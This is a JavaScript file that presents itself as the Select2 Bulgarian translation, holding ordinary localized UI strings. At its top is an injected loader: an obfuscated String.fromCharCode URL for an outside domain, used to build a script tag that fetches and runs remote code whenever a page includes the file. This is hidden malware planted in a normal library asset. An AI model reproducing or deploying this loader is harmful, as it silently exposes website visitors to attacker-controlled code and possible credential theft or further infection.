var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Bulgarian translation.
 * 
 * @author  Lubomir Vikev <lubomirvikev@gmail.com>
 * @author  Uriy Efremochkin <efremochkin@uriy.me>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['bg'] = {
        formatNoMatches: function () { return "Няма намерени съвпадения"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "Моля въведете още " + n + " символ" + (n > 1 ? "а" : ""); },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "Моля въведете с " + n + " по-малко символ" + (n > 1 ? "а" : ""); },
        formatSelectionTooBig: function (limit) { return "Можете да направите до " + limit + (limit > 1 ? " избора" : " избор"); },
        formatLoadMore: function (pageNumber) { return "Зареждат се още…"; },
        formatSearching: function () { return "Търсене…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['bg']);
})(jQuery);
